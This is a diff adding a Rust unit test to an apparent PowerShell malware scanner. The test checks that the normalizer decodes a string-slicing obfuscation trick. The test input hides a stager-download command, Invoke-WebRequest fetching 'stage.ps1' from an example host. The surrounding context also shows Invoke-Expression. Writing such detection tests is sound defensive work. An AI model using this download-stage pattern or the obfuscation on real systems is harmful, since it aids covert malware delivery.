@@ -15935,6 +15935,27 @@ Invoke-Expression $cmd"#,
     }
 
     #[test]
+    fn ps1_normalization_decodes_literal_tail_substring_extractor_call() {
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1";
+        let ps = format!(
+            r#"function Tail($value,$start) {{
+  return $value.Substring($start)
+}}
+Tail 'zz{decoded}' 2"#
+        );
+        let normalized = crate::ps1_scan::normalize_ps1_text(&ps);
+
+        assert!(
+            normalized.contains(
+                "'Invoke-WebRequest -Uri https://ps-tail-substring-extractor.example/stage.ps1'"
+            ),
+            "literal tail substring extractor call was not normalized:\n{}",
+            normalized
+        );
+    }
+
+    #[test]
     fn ps1_literal_new_item_function_path_name_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
